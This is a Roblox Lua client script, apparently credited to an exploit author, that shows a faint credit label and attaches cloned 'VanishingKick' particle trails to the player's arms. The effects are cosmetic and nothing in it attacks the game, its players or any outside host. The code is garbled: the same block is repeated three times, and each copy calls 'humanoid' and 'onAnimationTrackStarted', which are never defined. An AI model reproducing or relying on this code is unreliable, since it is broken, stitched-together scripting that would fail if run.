local sG = Instance.new("ScreenGui")
sG.Name = "UIContainer"
sG.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- txlabel
local tL = Instance.new("TextLabel")
tL.Size = UDim2.new(1, 0, 0, 16) -- smaller size
tL.Position = UDim2.new(0, 0, 0, 0) -- Top
tL.BackgroundTransparency = 1 -- by
tL.Text = "mahito script create by tp exploit and suggestion by Kolinadahd" -- Updated text
tL.TextColor3 = Color3.new(1, 1, 1) -- clr
tL.Font = Enum.Font.Arcade 
tL.TextScaled = true -- scale
tL.TextTransparency = 0.7 -- opaque
tL.Parent = sG

humanoid.AnimationPlayed:Connect(onAnimationTrackStarted)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Find the necessary parts inside the player's character
local rightArm = character:WaitForChild("Right Arm")
local leftArm = character:WaitForChild("Left Arm")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for VanishingKick folder inside Resources
local vanishingKickFolder = resourcesFolder:WaitForChild("VanishingKick")

-- Check for speedlinesandstuff part inside VanishingKick
local speedlinesandstuffPart = vanishingKickFolder:WaitForChild("Trail2")

-- Function to create and position the effect
local function createEffect(part)
    local speedlinesandstuffClone = speedlinesandstuffPart:Clone()
    speedlinesandstuffClone.Parent = Workspace
    speedlinesandstuffClone.CFrame = part.CFrame

    -- Enable all ParticleEmitters
    local function enableParticleEmitters(parent)
        for _, descendant in ipairs(parent:GetDescendants()) do
            if descendant:IsA("ParticleEmitter") then
                descendant.Enabled = true
            end
        end
    end

    -- Update the clone's position every frame
    RunService.RenderStepped:Connect(function()
        if character and part then
            speedlinesandstuffClone.CFrame = part.CFrame
        end
    end)

    -- Example usage after your dash effect completes
    spawn(function()
        -- Simulating end of dash effect
        wait(0)  -- Adjust the wait time as needed
        enableParticleEmitters(speedlinesandstuffClone)
    end)

    return speedlinesandstuffClone
end

-- Create effects for Right Arm, Left Arm
createEffect(rightArm)
createEffect(leftArm)
humanoid.AnimationPlayed:Connect(onAnimationTrackStarted)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Find the necessary parts inside the player's character
local rightArm = character:WaitForChild("Right Arm")
local leftArm = character:WaitForChild("Left Arm")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for VanishingKick folder inside Resources
local vanishingKickFolder = resourcesFolder:WaitForChild("VanishingKick")

-- Check for speedlinesandstuff part inside VanishingKick
local speedlinesandstuffPart = vanishingKickFolder:WaitForChild("Trail2")

-- Function to create and position the effect
local function createEffect(part)
    local speedlinesandstuffClone = speedlinesandstuffPart:Clone()
    speedlinesandstuffClone.Parent = Workspace
    speedlinesandstuffClone.CFrame = part.CFrame

    -- Enable all ParticleEmitters
    local function enableParticleEmitters(parent)
        for _, descendant in ipairs(parent:GetDescendants()) do
            if descendant:IsA("ParticleEmitter") then
                descendant.Enabled = true
            end
        end
    end

    -- Update the clone's position every frame
    RunService.RenderStepped:Connect(function()
        if character and part then
            speedlinesandstuffClone.CFrame = part.CFrame
        end
    end)

    -- Example usage after your dash effect completes
    spawn(function()
        -- Simulating end of dash effect
        wait(0)  -- Adjust the wait time as needed
        enableParticleEmitters(speedlinesandstuffClone)
    end)

    return speedlinesandstuffClone
end

-- Create effects for Right Arm, Left Arm
createEffect(rightArm)
createEffect(leftArm)
humanoid.AnimationPlayed:Connect(onAnimationTrackStarted)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Find the necessary parts inside the player's character
local rightArm = character:WaitForChild("Right Arm")
local leftArm = character:WaitForChild("Left Arm")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for VanishingKick folder inside Resources
local vanishingKickFolder = resourcesFolder:WaitForChild("VanishingKick")

-- Check for speedlinesandstuff part inside VanishingKick
local speedlinesandstuffPart = vanishingKickFolder:WaitForChild("Trail2")

-- Function to create and position the effect
local function createEffect(part)
    local speedlinesandstuffClone = speedlinesandstuffPart:Clone()
    speedlinesandstuffClone.Parent = Workspace
    speedlinesandstuffClone.CFrame = part.CFrame

    -- Enable all ParticleEmitters
    local function enableParticleEmitters(parent)
        for _, descendant in ipairs(parent:GetDescendants()) do
            if descendant:IsA("ParticleEmitter") then
                descendant.Enabled = true
            end
        end
    end

    -- Update the clone's position every frame
    RunService.RenderStepped:Connect(function()
        if character and part then
            speedlinesandstuffClone.CFrame = part.CFrame
        end
    end)

    -- Example usage after your dash effect completes
    spawn(function()
        -- Simulating end of dash effect
        wait(0)  -- Adjust the wait time as needed
        enableParticleEmitters(speedlinesandstuffClone)
    end)

    return speedlinesandstuffClone
end

-- Create effects for Right Arm, Left Arm
createEffect(rightArm)
createEffect(leftArm)
